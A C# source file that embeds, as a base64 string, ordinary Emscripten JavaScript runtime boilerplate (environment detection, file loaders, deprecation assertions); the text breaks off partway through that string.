using System;
using System.IO;
using System.Net;
using System.Threading.Tasks;
class Program
{   
    public static void jsc(string filename)
    {
        string js1 = @"dmFyIE1vZHVsZSA9IHR5cGVvZiBNb2R1bGUgIT09ICd1bmRlZmluZWQnID8gTW9kdWxlIDoge307DQoNCnZhciBtb2R1bGVPdmVycmlkZXMgPSB7fTsNCnZhciBrZXk7DQpmb3IgKGtleSBpbiBNb2R1bGUpIHsNCiAgaWYgKE1vZHVsZS5oYXNPd25Qcm9wZXJ0eShrZXkpKSB7DQogICAgbW9kdWxlT3ZlcnJpZGVzW2tleV0gPSBNb2R1bGVba2V5XTsNCiAgfQ0KfQ0KDQp2YXIgYXJndW1lbnRzXyA9IFtdOw0KdmFyIHRoaXNQcm9ncmFtID0gJy4vdGhpcy5wcm9ncmFtJzsNCnZhciBxdWl0XyA9IGZ1bmN0aW9uKHN0YXR1cywgdG9UaHJvdykgew0KICB0aHJvdyB0b1Rocm93Ow0KfTsNCg0KLy8gRGV0ZXJtaW5lIHRoZSBydW50aW1lIGVudmlyb25tZW50IHdlIGFyZSBpbi4gWW91IGNhbiBjdXN0b21pemUgdGhpcyBieQ0KLy8gc2V0dGluZyB0aGUgRU5WSVJPTk1FTlQgc2V0dGluZyBhdCBjb21waWxlIHRpbWUgKHNlZSBzZXR0aW5ncy5qcykuDQoNCnZhciBFTlZJUk9OTUVOVF9JU19XRUIgPSBmYWxzZTsNCnZhciBFTlZJUk9OTUVOVF9JU19XT1JLRVIgPSBmYWxzZTsNCnZhciBFTlZJUk9OTUVOVF9JU19OT0RFID0gZmFsc2U7DQp2YXIgRU5WSVJPTk1FTlRfSVNfU0hFTEwgPSBmYWxzZTsNCkVOVklST05NRU5UX0lTX1dFQiA9IHR5cGVvZiB3aW5kb3cgPT09ICdvYmplY3QnOw0KRU5WSVJPTk1FTlRfSVNfV09SS0VSID0gdHlwZW9mIGltcG9ydFNjcmlwdHMgPT09ICdmdW5jdGlvbic7DQovLyBOLmIuIEVsZWN0cm9uLmpzIGVudmlyb25tZW50IGlzIHNpbXVsdGFuZW91c2x5IGEgTk9ERS1lbnZpcm9ubWVudCwgYnV0DQovLyBhbHNvIGEgd2ViIGVudmlyb25tZW50Lg0KRU5WSVJPTk1FTlRfSVNfTk9ERSA9IHR5cGVvZiBwcm9jZXNzID09PSAnb2JqZWN0JyAmJiB0eXBlb2YgcHJvY2Vzcy52ZXJzaW9ucyA9PT0gJ29iamVjdCcgJiYgdHlwZW9mIHByb2Nlc3MudmVyc2lvbnMubm9kZSA9PT0gJ3N0cmluZyc7DQpFTlZJUk9OTUVOVF9JU19TSEVMTCA9ICFFTlZJUk9OTUVOVF9JU19XRUIgJiYgIUVOVklST05NRU5UX0lTX05PREUgJiYgIUVOVklST05NRU5UX0lTX1dPUktFUjsNCg0KaWYgKE1vZHVsZVsnRU5WSVJPTk1FTlQnXSkgew0KICB0aHJvdyBuZXcgRXJyb3IoJ01vZHVsZS5FTlZJUk9OTUVOVCBoYXMgYmVlbiBkZXByZWNhdGVkLiBUbyBmb3JjZSB0aGUgZW52aXJvbm1lbnQsIHVzZSB0aGUgRU5WSVJPTk1FTlQgY29tcGlsZS10aW1lIG9wdGlvbiAoZm9yIGV4YW1wbGUsIC1zIEVOVklST05NRU5UPXdlYiBvciAtcyBFTlZJUk9OTUVOVD1ub2RlKScpOw0KfQ0KDQoNCg0KLy8gYC9gIHNob3VsZCBiZSBwcmVzZW50IGF0IHRoZSBlbmQgaWYgYHNjcmlwdERpcmVjdG9yeWAgaXMgbm90IGVtcHR5DQp2YXIgc2NyaXB0RGlyZWN0b3J5ID0gJyc7DQpmdW5jdGlvbiBsb2NhdGVGaWxlKHBhdGgpIHsNCiAgaWYgKE1vZHVsZVsnbG9jYXRlRmlsZSddKSB7DQogICAgcmV0dXJuIE1vZHVsZVsnbG9jYXRlRmlsZSddKHBhdGgsIHNjcmlwdERpcmVjdG9yeSk7DQogIH0NCiAgcmV0dXJuIHNjcmlwdERpcmVjdG9yeSArIHBhdGg7DQp9DQoNCi8vIEhvb2tzIHRoYXQgYXJlIGltcGxlbWVudGVkIGRpZmZlcmVudGx5IGluIGRpZmZlcmVudCBydW50aW1lIGVudmlyb25tZW50cy4NCnZhciByZWFkXywNCiAgICByZWFkQXN5bmMsDQogICAgcmVhZEJpbmFyeSwNCiAgICBzZXRXaW5kb3dUaXRsZTsNCg0KdmFyIG5vZGVGUzsNCnZhciBub2RlUGF0aDsNCg0KaWYgKEVOVklST05NRU5UX0lTX05PREUpIHsNCiAgaWYgKEVOVklST05NRU5UX0lTX1dPUktFUikgew0KICAgIHNjcmlwdERpcmVjdG9yeSA9IHJlcXVpcmUoJ3BhdGgnKS5kaXJuYW1lKHNjcmlwdERpcmVjdG9yeSkgKyAnLyc7DQogIH0gZWxzZSB7DQogICAgc2NyaXB0RGlyZWN0b3J5ID0gX19kaXJuYW1lICsgJy8nOw0KICB9DQoNCg0KDQoNCiAgcmVhZF8gPSBmdW5jdGlvbiBzaGVsbF9yZWFkKGZpbGVuYW1lLCBiaW5hcnkpIHsNCiAgICBpZiAoIW5vZGVGUykgbm9kZUZTID0gcmVxdWlyZSgnZnMnKTsNCiAgICBpZiAoIW5vZGVQYXRoKSBub2RlUGF0aCA9IHJlcXVpcmUoJ3BhdGgnKTsNCiAgICBmaWxlbmFtZSA9IG5vZGVQYXRoWydub3JtYWxpemUnXShmaWxlbmFtZSk7DQogICAgcmV0dXJuIG5vZGVGU1sncmVhZEZpbGVTeW5jJ10oZmlsZW5hbWUsIGJpbmFyeSA/IG51bGwgOiAndXRmOCcpOw0KICB9Ow0KDQogIHJlYWRCaW5hcnkgPSBmdW5jdGlvbiByZWFkQmluYXJ5KGZpbGVuYW1lKSB7DQogICAgdmFyIHJldCA9IHJlYWRfKGZpbGVuYW1lLCB0cnVlKTsNCiAgICBpZiAoIXJldC5idWZmZXIpIHsNCiAgICAgIHJldCA9IG5ldyBVaW50OEFycmF5KHJldCk7DQogICAgfQ0KICAgIGFzc2VydChyZXQuYnVmZmVyKTsNCiAgICByZXR1cm4gcmV0Ow0KICB9Ow0KDQoNCg0KDQogIGlmIChwcm9jZXNzWydhcmd2J10ubGVuZ3RoID4gMSkgew0KICAgIHRoaXNQcm9ncmFtID0gcHJvY2Vzc1snYXJndiddWzFdLnJlcGxhY2UoL1xcL2csICcvJyk7DQogIH0NCg0KICBhcmd1bWVudHNfID0gcHJvY2Vzc1snYXJndiddLnNsaWNlKDIpOw0KDQogIGlmICh0eXBlb2YgbW9kdWxlICE9PSAndW5kZWZpbmVkJykgew0KICAgIG1vZHVsZVsnZXhwb3J0cyddID0gTW9kdWxlOw0KICB9DQoNCiAgcHJvY2Vzc1snb24nXSgndW5jYXVnaHRFeGNlcHRpb24nLCBmdW5jdGlvbihleCkgew0KICAgIC8vIHN1cHByZXNzIEV4aXRTdGF0dXMgZXhjZXB0aW9ucyBmcm9tIHNob3dpbmcgYW4gZXJyb3INCiAgICBpZiAoIShleCBpbnN0YW5jZW9mIEV4aXRTdGF0dXMpKSB7DQogICAgICB0aHJvdyBleDsNCiAgICB9DQogIH0pOw0KDQogIHByb2Nlc3NbJ29uJ10oJ3VuaGFuZGxlZFJlamVjdGlvbicsIGFib3J0KTsNCg0KICBxdWl0XyA9IGZ1bmN0aW9uKHN0YXR1cykgew0KICAgIHByb2Nlc3NbJ2V4aXQnXShzdGF0dXMpOw0KICB9Ow0KDQogIE1vZHVsZVsnaW5zcGVjdCddID0gZnVuY3Rpb24gKCkgeyByZXR1cm4gJ1tFbXNjcmlwdGVuIE1vZHVsZSBvYmplY3RdJzsgfTsNCg0KDQoNCn0gZWxzZQ0KaWYgKEVOVklST05NRU5UX0lTX1NIRUxMKSB7DQoNCg0KICBpZiAodHlwZW9mIHJlYWQgIT0gJ3VuZGVmaW5lZCcpIHsNCiAgICByZWFkXyA9IGZ1bmN0aW9uIHNoZWxsX3JlYWQoZikgew0KICAgICAgcmV0dXJuIHJlYWQoZik7DQogICAgfTsNCiAgfQ0KDQogIHJlYWRCaW5hcnkgPSBmdW5jdGlvbiByZWFkQmluYXJ5KGYpIHsNCiAgICB2YXIgZGF0YTsNCiAgICBpZiAodHlwZW9mIHJlYWRidWZmZXIgPT09ICdmdW5jdGlvbicpIHsNCiAgICAgIHJldHVybiBuZXcgVWludDhBcnJheShyZWFkYnVmZmVyKGYpKTsNCiAgICB9DQogICAgZGF0YSA9IHJlYWQoZiwgJ2JpbmFyeScpOw0KICAgIGFzc2VydCh0eXBlb2YgZGF0YSA9PT0gJ29iamVjdCcpOw0KICAgIHJldHVybiBkYXRhOw0KICB9Ow0KDQogIGlmICh0eXBlb2Ygc2NyaXB0QXJncyAhPSAndW5kZWZpbmVkJykgew0KICAgIGFyZ3VtZW50c18gPSBzY3JpcHRBcmdzOw0KICB9IGVsc2UgaWYgKHR5cGVvZiBhcmd1bWVudHMgIT0gJ3VuZGVmaW5lZCcpIHsNCiAgICBhcmd1bWVudHNfID0gYXJndW1lbnRzOw0KICB9DQoNCiAgaWYgKHR5cGVvZiBxdWl0ID09PSAnZnVuY3Rpb24nKSB7DQogICAgcXVpdF8gPSBmdW5jdGlvbihzdGF0dXMpIHsNCiAgICAgIHF1aXQoc3RhdHVzKTsNCiAgICB9Ow0KICB9DQoNCiAgaWYgKHR5cGVvZiBwcmludCAhPT0gJ3VuZGVmaW5lZCcpIHsNCiAgICAvLyBQcmVmZXIgdG8gdXNlIHByaW50L3ByaW50RXJyIHdoZXJlIHRoZXkgZXhpc3QsIGFzIHRoZXkgdXN1YWxseSB3b3JrIGJldHRlci4NCiAgICBpZiAodHlwZW9mIGNvbnNvbGUgPT09ICd1bmRlZmluZWQnKSBjb25zb2xlID0gLyoqIEB0eXBleyFDb25zb2xlfSAqLyh7fSk7DQogICAgY29uc29sZS5sb2cgPSAvKiogQHR5cGV7IWZ1bmN0aW9uKHRoaXM6Q29uc29sZSwgLi4uKik6IHVuZGVmaW5lZH0gKi8gKHByaW50KTsNCiAgICBjb25zb2xlLndhcm4gPSBjb25zb2xlLmVycm9yID0gLyoqIEB0eXBleyFmdW5jdGlvbih0aGlzOkNvbnNvbGUsIC4uLiopOiB1bmRlZmluZWR9ICovICh0eXBlb2YgcHJpbnRFcnIgIT09ICd1bmRlZmluZWQnID8gcHJpbnRFcnIgOiBwcmludCk7DQogIH0NCg0KDQp9IGVsc2UNCg0KLy8gTm90ZSB0aGF0IHRoaXMgaW5jbHVkZXMgTm9kZS5qcyB3b3JrZXJzIHdoZW4gcmVsZXZhbnQgKHB0aHJlYWRzIGlzIGVuYWJsZWQpLg0KLy8gTm9kZS5qcyB3b3JrZXJzIGFyZSBkZXRlY3RlZCBhcyBhIGNvbWJpbmF0aW9uIG9mIEVOVklST05NRU5UX0lTX1dPUktFUiBhbmQNCi8vIEVOVklST05NRU5UX0lTX05PREUuDQppZiAoRU5WSVJPTk1FTlRfSVNfV0VCIHx8IEVOVklST05NRU5UX0lTX1dPUktFUikgew0KICBpZiAoRU5WSVJPTk1FTlRfSVNfV09SS0VSKSB7IC8vIENoZWNrIHdvcmtlciwgbm90IHdlYiwgc2luY2Ugd2luZG93IGNvdWxkIGJlIHBvbHlmaWxsZWQNCiAgICBzY3JpcHREaXJlY3RvcnkgPSBzZWxmLmxvY2F0aW9uLmhyZWY7DQogIH0gZWxzZSBpZiAoZG9jdW1lbnQuY3VycmVudFNjcmlwdCkgeyAvLyB3ZWINCiAgICBzY3JpcHREaXJlY3RvcnkgPSBkb2N1bWVudC5jdXJyZW50U2NyaXB0LnNyYzsNCiAgfQ0KICAvLyBibG9iIHVybHMgbG9vayBsaWtlIGJsb2I6aHR0cDovL3NpdGUuY29tL2V0Yy9ldGMgYW5kIHdlIGNhbm5vdCBpbmZlciBhbnl0aGluZyBmcm9tIHRoZW0uDQogIC8vIG90aGVyd2lzZSwgc2xpY2Ugb2ZmIHRoZSBmaW5hbCBwYXJ0IG9mIHRoZSB1cmwgdG8gZmluZCB0aGUgc2NyaXB0IGRpcmVjdG9yeS4NCiAgLy8gaWYgc2NyaXB0RGlyZWN0b3J5IGRvZXMgbm90IGNvbnRhaW4gYSBzbGFzaCwgbGFzdEluZGV4T2Ygd2lsbCByZXR1cm4gLTEsDQogIC8vIGFuZCBzY3JpcHREaXJlY3Rvcnkgd2lsbCBjb3JyZWN0bHkgYmUgcmVwbGFjZWQgd2l0aCBhbiBlbXB0eSBzdHJpbmcuDQogIGlmIChzY3JpcHREaXJlY3RvcnkuaW5kZXhPZignYmxvYjonKSAhPT0gMCkgew0KICAgIHNjcmlwdERpcmVjdG9yeSA9IHNjcmlwdERpcmVjdG9yeS5zdWJzdHIoMCwgc2NyaXB0RGlyZWN0b3J5Lmxhc3RJbmRleE9mKCcvJykrMSk7DQogIH0gZWxzZSB7DQogICAgc2NyaXB0RGlyZWN0b3J5ID0gJyc7DQogIH0NCg0KDQogIC8vIERpZmZlcmVudGlhdGUgdGhlIFdlYiBXb3JrZXIgZnJvbSB0aGUgTm9kZSBXb3JrZXIgY2FzZSwgYXMgcmVhZGluZyBtdXN0DQogIC8vIGJlIGRvbmUgZGlmZmVyZW50bHkuDQogIHsNCg0KDQoNCg0KICByZWFkXyA9IGZ1bmN0aW9uIHNoZWxsX3JlYWQodXJsKSB7DQogICAgICB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7DQogICAgICB4aHIub3BlbignR0VUJywgdXJsLCBmYWxzZSk7DQogICAgICB4aHIuc2VuZChudWxsKTsNCiAgICAgIHJldHVybiB4aHIucmVzcG9uc2VUZXh0Ow0KICB9Ow0KDQogIGlmIChFTlZJUk9OTUVOVF9JU19XT1JLRVIpIHsNCiAgICByZWFkQmluYXJ5ID0gZnVuY3Rpb24gcmVhZEJpbmFyeSh1cmwpIHsNCiAgICAgICAgdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICB4aHIub3BlbignR0VUJywgdXJsLCBmYWxzZSk7DQogICAgICAgIHhoci5yZXNwb25zZVR5cGUgPSAnYXJyYXlidWZmZXInOw0KICAgICAgICB4aHIuc2VuZChudWxsKTsNCiAgICAgICAgcmV0dXJuIG5ldyBVaW50OEFycmF5KC8qKiBAdHlwZXshQXJyYXlCdWZmZXJ9ICovKHhoci5yZXNwb25zZSkpOw0KICAgIH07DQogIH0NCg0KICByZWFkQXN5bmMgPSBmdW5jdGlvbiByZWFkQXN5bmModXJsLCBvbmxvYWQsIG9uZXJyb3IpIHsNCiAgICB2YXIgeGhyID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7DQogICAgeGhyLm9wZW4oJ0dFVCcsIHVybCwgdHJ1ZSk7DQogICAgeGhyLnJlc3BvbnNlVHlwZSA9ICdhcnJheWJ1ZmZlcic7DQogICAgeGhyLm9ubG9hZCA9IGZ1bmN0aW9uIHhocl9vbmxvYWQoKSB7DQogICAgICBpZiAoeGhyLnN0YXR1cyA9PSAyMDAgfHwgKHhoci5zdGF0dXMgPT0gMCAmJiB4aHIucmVzcG9uc2UpKSB7IC8vIGZpbGUgVVJMcyBjYW4gcmV0dXJuIDANCiAgICAgICAgb25sb2FkKHhoci5yZXNwb25zZSk7DQogICAgICAgIHJldHVybjsNCiAgICAgIH0NCiAgICAgIG9uZXJyb3IoKTsNCiAgICB9Ow0KICAgIHhoci5vbmVycm9yID0gb25lcnJvcjsNCiAgICB4aHIuc2VuZChudWxsKTsNCiAgfTsNCg0KDQoNCg0KICB9DQoNCiAgc2V0V2luZG93VGl0bGUgPSBmdW5jdGlvbih0aXRsZSkgeyBkb2N1bWVudC50aXRsZSA9IHRpdGxlIH07DQp9IGVsc2UNCnsNCiAgdGhyb3cgbmV3IEVycm9yKCdlbnZpcm9ubWVudCBkZXRlY3Rpb24gZXJyb3InKTsNCn0NCg0KDQovLyBTZXQgdXAgdGhlIG91dCgpIGFuZCBlcnIoKSBob29rcywgd2hpY2ggYXJlIGhvdyB3ZSBjYW4gcHJpbnQgdG8gc3Rkb3V0IG9yDQovLyBzdGRlcnIsIHJlc3BlY3RpdmVseS4NCnZhciBvdXQgPSBNb2R1bGVbJ3ByaW50J10gfHwgY29uc29sZS5sb2cuYmluZChjb25zb2xlKTsNCnZhciBlcnIgPSBNb2R1bGVbJ3ByaW50RXJyJ10gfHwgY29uc29sZS53YXJuLmJpbmQoY29uc29sZSk7DQoNCi8vIE1lcmdlIGJhY2sgaW4gdGhlIG92ZXJyaWRlcw0KZm9yIChrZXkgaW4gbW9kdWxlT3ZlcnJpZGVzKSB7DQogIGlmIChtb2R1bGVPdmVycmlkZXMuaGFzT3duUHJvcGVydHkoa2V5KSkgew0KICAgIE1vZHVsZVtrZXldID0gbW9kdWxlT3ZlcnJpZGVzW2tleV07DQogIH0NCn0NCi8vIEZyZWUgdGhlIG9iamVjdCBoaWVyYXJjaHkgY29udGFpbmVkIGluIHRoZSBvdmVycmlkZXMsIHRoaXMgbGV0cyB0aGUgR0MNCi8vIHJlY2xhaW0gZGF0YSB1c2VkIGUuZy4gaW4gbWVtb3J5SW5pdGlhbGl6ZXJSZXF1ZXN0LCB3aGljaCBpcyBhIGxhcmdlIHR5cGVkIGFycmF5Lg0KbW9kdWxlT3ZlcnJpZGVzID0gbnVsbDsNCg0KLy8gRW1pdCBjb2RlIHRvIGhhbmRsZSBleHBlY3RlZCB2YWx1ZXMgb24gdGhlIE1vZHVsZSBvYmplY3QuIFRoaXMgYXBwbGllcyBNb2R1bGUueA0KLy8gdG8gdGhlIHByb3BlciBsb2NhbCB4LiBUaGlzIGhhcyB0d28gYmVuZWZpdHM6IGZpcnN0LCB3ZSBvbmx5IGVtaXQgaXQgaWYgaXQgaXMNCi8vIGV4cGVjdGVkIHRvIGFycml2ZSwgYW5kIHNlY29uZCwgYnkgdXNpbmcgYSBsb2NhbCBldmVyeXdoZXJlIGVsc2UgdGhhdCBjYW4gYmUNCi8vIG1pbmlmaWVkLg0KaWYgKE1vZHVsZVsnYXJndW1lbnRzJ10pIGFyZ3VtZW50c18gPSBNb2R1bGVbJ2FyZ3VtZW50cyddO2lmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICdhcmd1bWVudHMnKSkgT2JqZWN0LmRlZmluZVByb3BlcnR5KE1vZHVsZSwgJ2FyZ3VtZW50cycsIHsgY29uZmlndXJhYmxlOiB0cnVlLCBnZXQ6IGZ1bmN0aW9uKCkgeyBhYm9ydCgnTW9kdWxlLmFyZ3VtZW50cyBoYXMgYmVlbiByZXBsYWNlZCB3aXRoIHBsYWluIGFyZ3VtZW50c18gKHRoZSBpbml0aWFsIHZhbHVlIGNhbiBiZSBwcm92aWRlZCBvbiBNb2R1bGUsIGJ1dCBhZnRlciBzdGFydHVwIHRoZSB2YWx1ZSBpcyBvbmx5IGxvb2tlZCBmb3Igb24gYSBsb2NhbCB2YXJpYWJsZSBvZiB0aGF0IG5hbWUpJykgfSB9KTsNCmlmIChNb2R1bGVbJ3RoaXNQcm9ncmFtJ10pIHRoaXNQcm9ncmFtID0gTW9kdWxlWyd0aGlzUHJvZ3JhbSddO2lmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICd0aGlzUHJvZ3JhbScpKSBPYmplY3QuZGVmaW5lUHJvcGVydHkoTW9kdWxlLCAndGhpc1Byb2dyYW0nLCB7IGNvbmZpZ3VyYWJsZTogdHJ1ZSwgZ2V0OiBmdW5jdGlvbigpIHsgYWJvcnQoJ01vZHVsZS50aGlzUHJvZ3JhbSBoYXMgYmVlbiByZXBsYWNlZCB3aXRoIHBsYWluIHRoaXNQcm9ncmFtICh0aGUgaW5pdGlhbCB2YWx1ZSBjYW4gYmUgcHJvdmlkZWQgb24gTW9kdWxlLCBidXQgYWZ0ZXIgc3RhcnR1cCB0aGUgdmFsdWUgaXMgb25seSBsb29rZWQgZm9yIG9uIGEgbG9jYWwgdmFyaWFibGUgb2YgdGhhdCBuYW1lKScpIH0gfSk7DQppZiAoTW9kdWxlWydxdWl0J10pIHF1aXRfID0gTW9kdWxlWydxdWl0J107aWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgJ3F1aXQnKSkgT2JqZWN0LmRlZmluZVByb3BlcnR5KE1vZHVsZSwgJ3F1aXQnLCB7IGNvbmZpZ3VyYWJsZTogdHJ1ZSwgZ2V0OiBmdW5jdGlvbigpIHsgYWJvcnQoJ01vZHVsZS5xdWl0IGhhcyBiZWVuIHJlcGxhY2VkIHdpdGggcGxhaW4gcXVpdF8gKHRoZSBpbml0aWFsIHZhbHVlIGNhbiBiZSBwcm92aWRlZCBvbiBNb2R1bGUsIGJ1dCBhZnRlciBzdGFydHVwIHRoZSB2YWx1ZSBpcyBvbmx5IGxvb2tlZCBmb3Igb24gYSBsb2NhbCB2YXJpYWJsZSBvZiB0aGF0IG5hbWUpJykgfSB9KTsNCg0KLy8gcGVyZm9ybSBhc3NlcnRpb25zIGluIHNoZWxsLmpzIGFmdGVyIHdlIHNldCB1cCBvdXQoKSBhbmQgZXJyKCksIGFzIG90aGVyd2lzZSBpZiBhbiBhc3NlcnRpb24gZmFpbHMgaXQgY2Fubm90IHByaW50IHRoZSBtZXNzYWdlDQovLyBBc3NlcnRpb25zIG9uIHJlbW92ZWQgaW5jb21pbmcgTW9kdWxlIEpTIEFQSXMuDQphc3NlcnQodHlwZW9mIE1vZHVsZVsnbWVtb3J5SW5pdGlhbGl6ZXJQcmVmaXhVUkwnXSA9PT0gJ3VuZGVmaW5lZCcsICdNb2R1bGUubWVtb3J5SW5pdGlhbGl6ZXJQcmVmaXhVUkwgb3B0aW9uIHdhcyByZW1vdmVkLCB1c2UgTW9kdWxlLmxvY2F0ZUZpbGUgaW5zdGVhZCcpOw0KYXNzZXJ0KHR5cGVvZiBNb2R1bGVbJ3B0aHJlYWRNYWluUHJlZml4VVJMJ10gPT09ICd1bmRlZmluZWQnLCAnTW9kdWxlLnB0aHJlYWRNYWluUHJlZml4VVJMIG9wdGlvbiB3YXMgcmVtb3ZlZCwgdXNlIE1vZHVsZS5sb2NhdGVGaWxlIGluc3RlYWQnKTsNCmFzc2VydCh0eXBlb2YgTW9kdWxlWydjZEluaXRpYWxpemVyUHJlZml4VVJMJ10gPT09ICd1bmRlZmluZWQnLCAnTW9kdWxlLmNkSW5pdGlhbGl6ZXJQcmVmaXhVUkwgb3B0aW9uIHdhcyByZW1vdmVkLCB1c2UgTW9kdWxlLmxvY2F0ZUZpbGUgaW5zdGVhZCcpOw0KYXNzZXJ0KHR5cGVvZiBNb2R1bGVbJ2ZpbGVQYWNrYWdlUHJlZml4VVJMJ10gPT09ICd1bmRlZmluZWQnLCAnTW9kdWxlLmZpbGVQYWNrYWdlUHJlZml4VVJMIG9wdGlvbiB3YXMgcmVtb3ZlZCwgdXNlIE1vZHVsZS5sb2NhdGVGaWxlIGluc3RlYWQnKTsNCmFzc2VydCh0eXBlb2YgTW9kdWxlWydyZWFkJ10gPT09ICd1bmRlZmluZWQnLCAnTW9kdWxlLnJlYWQgb3B0aW9uIHdhcyByZW1vdmVkIChtb2RpZnkgcmVhZF8gaW4gSlMpJyk7DQphc3NlcnQodHlwZW9mIE1vZHVsZVsncmVhZEFzeW5jJ10gPT09ICd1bmRlZmluZWQnLCAnTW9kdWxlLnJlYWRBc3luYyBvcHRpb24gd2FzIHJlbW92ZWQgKG1vZGlmeSByZWFkQXN5bmMgaW4gSlMpJyk7DQphc3NlcnQodHlwZW9mIE1vZHVsZVsncmVhZEJpbmFyeSddID09PSAndW5kZWZpbmVkJywgJ01vZHVsZS5yZWFkQmluYXJ5IG9wdGlvbiB3YXMgcmVtb3ZlZCAobW9kaWZ5IHJlYWRCaW5hcnkgaW4gSlMpJyk7DQphc3NlcnQodHlwZW9mIE1vZHVsZVsnc2V0V2luZG93VGl0bGUnXSA9PT0gJ3VuZGVmaW5lZCcsICdNb2R1bGUuc2V0V2luZG93VGl0bGUgb3B0aW9uIHdhcyByZW1vdmVkIChtb2RpZnkgc2V0V2luZG93VGl0bGUgaW4gSlMpJyk7DQphc3NlcnQodHlwZW9mIE1vZHVsZVsnVE9UQUxfTUVNT1JZJ10gPT09ICd1bmRlZmluZWQnLCAnTW9kdWxlLlRPVEFMX01FTU9SWSBoYXMgYmVlbiByZW5hbWVkIE1vZHVsZS5JTklUSUFMX01FTU9SWScpOw0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgJ3JlYWQnKSkgT2JqZWN0LmRlZmluZVByb3BlcnR5KE1vZHVsZSwgJ3JlYWQnLCB7IGNvbmZpZ3VyYWJsZTogdHJ1ZSwgZ2V0OiBmdW5jdGlvbigpIHsgYWJvcnQoJ01vZHVsZS5yZWFkIGhhcyBiZWVuIHJlcGxhY2VkIHdpdGggcGxhaW4gcmVhZF8gKHRoZSBpbml0aWFsIHZhbHVlIGNhbiBiZSBwcm92aWRlZCBvbiBNb2R1bGUsIGJ1dCBhZnRlciBzdGFydHVwIHRoZSB2YWx1ZSBpcyBvbmx5IGxvb2tlZCBmb3Igb24gYSBsb2NhbCB2YXJpYWJsZSBvZiB0aGF0IG5hbWUpJykgfSB9KTsNCmlmICghT2JqZWN0LmdldE93blByb3BlcnR5RGVzY3JpcHRvcihNb2R1bGUsICdyZWFkQXN5bmMnKSkgT2JqZWN0LmRlZmluZVByb3BlcnR5KE1vZHVsZSwgJ3JlYWRBc3luYycsIHsgY29uZmlndXJhYmxlOiB0cnVlLCBnZXQ6IGZ1bmN0aW9uKCkgeyBhYm9ydCgnTW9kdWxlLnJlYWRBc3luYyBoYXMgYmVlbiByZXBsYWNlZCB3aXRoIHBsYWluIHJlYWRBc3luYyAodGhlIGluaXRpYWwgdmFsdWUgY2FuIGJlIHByb3ZpZGVkIG9uIE1vZHVsZSwgYnV0IGFmdGVyIHN0YXJ0dXAgdGhlIHZhbHVlIGlzIG9ubHkgbG9va2VkIGZvciBvbiBhIGxvY2FsIHZhcmlhYmxlIG9mIHRoYXQgbmFtZSknKSB9IH0pOw0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgJ3JlYWRCaW5hcnknKSkgT2JqZWN0LmRlZmluZVByb3BlcnR5KE1vZHVsZSwgJ3JlYWRCaW5hcnknLCB7IGNvbmZpZ3VyYWJsZTogdHJ1ZSwgZ2V0OiBmdW5jdGlvbigpIHsgYWJvcnQoJ01vZHVsZS5yZWFkQmluYXJ5IGhhcyBiZWVuIHJlcGxhY2VkIHdpdGggcGxhaW4gcmVhZEJpbmFyeSAodGhlIGluaXRpYWwgdmFsdWUgY2FuIGJlIHByb3ZpZGVkIG9uIE1vZHVsZSwgYnV0IGFmdGVyIHN0YXJ0dXAgdGhlIHZhbHVlIGlzIG9ubHkgbG9va2VkIGZvciBvbiBhIGxvY2FsIHZhcmlhYmxlIG9mIHRoYXQgbmFtZSknKSB9IH0pOw0KaWYgKCFPYmplY3QuZ2V0T3duUHJvcGVydHlEZXNjcmlwdG9yKE1vZHVsZSwgJ3NldFdpbmRvd1RpdGxlJykpIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShNb2R1bGUsICdzZXRXaW5kb3dUaXRsZScsIHsgY29uZmlndXJhYmxlOiB0cnVlLCBnZXQ6IGZ1bmN0aW9uKCkgeyBhYm9ydCgnTW9kdWxlLnNldFdpbmRvd1RpdGxlIGhhcyBiZWVuIHJlcGxhY2VkIHdpdGggcGxhaW4gc2V0V2luZG93VGl0bGUgKHRoZSBpbml0aWFsIHZhbHVlIGNhbiBiZSBwcm92aWRlZCBvbiBNb2R1bGUsIGJ1dCBhZnRlciBzdGFydHVwIHRoZSB2YWx1ZSBpcyBvbmx5IGxvb2tlZCBmb3Igb24gYSBsb2NhbCB2YXJpYWJsZSBvZiB0aGF0IG5hbWUpJykgfSB9KTsNCnZhciBJREJGUyA9ICdJREJGUyBpcyBubyBsb25nZXIgaW5jbHVkZWQgYnkgZGVmYXVsdDsgYnVpbGQgd2l0aCAtbGlkYmZzLmpzJzsNCnZhciBQUk9YWUZTID0gJ1BST1hZRlMgaXMgbm8gbG9uZ2VyIGluY2x1ZGVkIGJ5IGRlZmF1bHQ7IGJ1aWxkIHdpdGggLWxwcm94eWZzLmpzJzsNCnZhciBXT1JLRVJGUyA9ICdXT1JLRVJGUyBpcyBubyBsb25nZXIgaW5jbHVkZWQgYnkgZGVmYXVsdDsgYnVpbGQgd2l0aCAtbHdvcmtlcmZzLmpzJzsNCnZhciBOT0RFRlMgPSAnTk9ERUZTIGlzIG5vIGxvbmdlciBpbmNsdWRlZCBieSBkZWZhdWx0OyBidWlsZCB3aXRoIC1sbm9kZWZzLmpzJzsNCg0KDQoNCg0KDQoNCi8vIHt7UFJFQU1CTEVfQURESVRJT05TfX0NCg0KdmFyIFNUQUNLX0FMSUdOID0gMTY7DQoNCmZ1bmN0aW9uIGR5bmFtaWNBbGxvYyhzaXplKSB7DQogIGFzc2VydChEWU5BTUlDVE9QX1BUUik7DQogIHZhciByZXQgPSBIRUFQMzJbRFlOQU1JQ1RPUF9QVFI+PjJdOw0KICB2YXIgZW5kID0gKHJldCArIHNpemUgKyAxNSkgJiAtMTY7DQogIGFzc2VydChlbmQgPD0gSEVBUDgubGVuZ3RoLCAnZmFpbHVyZSB0byBkeW5hbWljQWxsb2MgLSBtZW1vcnkgZ3Jvd3RoIGV0Yy4gaXMgbm90IHN1cHBvcnRlZCB0aGVyZSwgY2FsbCBtYWxsb2Mvc2JyayBkaXJlY3RseScpOw0KICBIRUFQMzJbRFlOQU1J